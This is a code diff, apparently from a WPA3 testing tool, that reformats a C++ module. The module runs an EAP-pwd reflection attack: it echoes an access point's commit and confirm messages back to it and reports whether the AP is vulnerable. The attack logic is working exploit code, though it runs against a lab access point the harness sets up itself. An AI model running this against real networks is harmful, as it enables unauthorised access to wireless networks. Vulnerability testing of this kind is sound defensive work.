@@ -17,10 +17,8 @@ using namespace filesystem;
 using namespace Tins;
 
 namespace wpa3_tester::reflection{
-
-
 bool run_reflection_exchange(EAP_Att &eap_att){
-	if(!do_auth(eap_att))  return false;
+	if(!do_auth(eap_att)) return false;
 	if(!do_assoc(eap_att)) return false;
 
 	// poll for an EAPOL frame satisfying pred, or EAP-Success (returned as empty vector).
@@ -32,12 +30,18 @@ bool run_reflection_exchange(EAP_Att &eap_att){
 	// COMMIT
 	{
 		optional<EapPwdFrame> frame;
-		const auto eapol = wait_eapol(eap_att, [&](const vector<uint8_t>& e){
+		const auto eapol = wait_eapol(eap_att, [&](const vector<uint8_t> &e){
 			const auto f = parse_eap_pwd(e);
-			if(f && f->opcode == eap::PWD_OPCODE_COMMIT){ frame = f; return true; }
+			if(f && f->opcode == eap::PWD_OPCODE_COMMIT){
+				frame = f;
+				return true;
+			}
 			return false;
 		});
-		if(!eapol){ log(LogLevel::WARNING, "EAP commit ended without success"); return false; }
+		if(!eapol){
+			log(LogLevel::WARNING, "EAP commit ended without success");
+			return false;
+		}
 		log(LogLevel::INFO, "EAP-PWD-Commit Request – reflecting scalar+element");
 		send_eapol(eap_att, reflect_commit(*frame));
 	}
@@ -45,12 +49,18 @@ bool run_reflection_exchange(EAP_Att &eap_att){
 	// CONFIRM
 	{
 		optional<EapPwdFrame> frame;
-		const auto eapol = wait_eapol(eap_att, [&](const vector<uint8_t>& e){
+		const auto eapol = wait_eapol(eap_att, [&](const vector<uint8_t> &e){
 			const auto f = parse_eap_pwd(e);
-			if(f && f->opcode == eap::PWD_OPCODE_CONFIRM){ frame = f; return true; }
+			if(f && f->opcode == eap::PWD_OPCODE_CONFIRM){
+				frame = f;
+				return true;
+			}
 			return false;
 		});
-		if(!eapol){ log(LogLevel::WARNING, "EAP confirm exchange ended without success"); return false; }
+		if(!eapol){
+			log(LogLevel::WARNING, "EAP confirm exchange ended without success");
+			return false;
+		}
 		log(LogLevel::INFO, "EAP-PWD-Confirm Request – reflecting confirm value");
 		send_eapol(eap_att, reflect_confirm(*frame));
 	}
@@ -59,8 +69,7 @@ bool run_reflection_exchange(EAP_Att &eap_att){
 }
 
 void setup_attack(RunStatus &rs){
-	copy_f(rs.config_path().parent_path() / "config/hostapd.eap_user",
-			  rs.run_folder() / "hostapd.eap_user");
+	copy_f(rs.config_path().parent_path() / "config/hostapd.eap_user", rs.run_folder() / "hostapd.eap_user");
 
 	program::start(rs, "access_point");
 	rs.process_manager.wait_for("access_point", "AP-ENABLED", seconds(40));
@@ -70,31 +79,22 @@ void setup_attack(RunStatus &rs){
 
 void run_attack(RunStatus &rs){
 	rs.start_observers();
-	const auto &att_cfg  = rs.config().at("attack_config");
-	const auto attacker  = rs.get_actor("attacker");
-	const auto ap_actor  = rs.get_actor("access_point");
+	const auto &att_cfg = rs.config().at("attack_config");
+	const auto attacker = rs.get_actor("attacker");
+	const auto ap_actor = rs.get_actor("access_point");
 
-	const string identity   = att_cfg.at("identity").get<string>();
-	const string ssid       = ap_actor->get(SK::ssid);
+	const string identity = att_cfg.at("identity").get<string>();
+	const string ssid = ap_actor->get(SK::ssid);
 
 	const HWAddress<6> our_mac(attacker.get(SK::mac));
 	const HWAddress<6> ap_mac(ap_actor.get(SK::mac));
 
 	MonitorSocket sock(attacker.get(SK::iface), attacker.get(SK::netns)); // attacker need to be in netns
-	EAP_Att eap_att{
-		sock,
-		ap_actor->get_channel(),
-		our_mac,
-		ap_mac,
-		ssid,
-		identity,
-		30s
-	};
+	EAP_Att eap_att{sock, ap_actor->get_channel(), our_mac, ap_mac, ssid, identity, 30s};
 	this_thread::sleep_for(seconds(3)); //FIXME needed for tshark setup?
 	const bool vulnerable = run_reflection_exchange(eap_att);
 
 	rs.save_result({{"passed", vulnerable}});
 	log(LogLevel::INFO, "Reflection attack result: {}", vulnerable ? "VULNERABLE" : "not vulnerable");
 }
-
 }
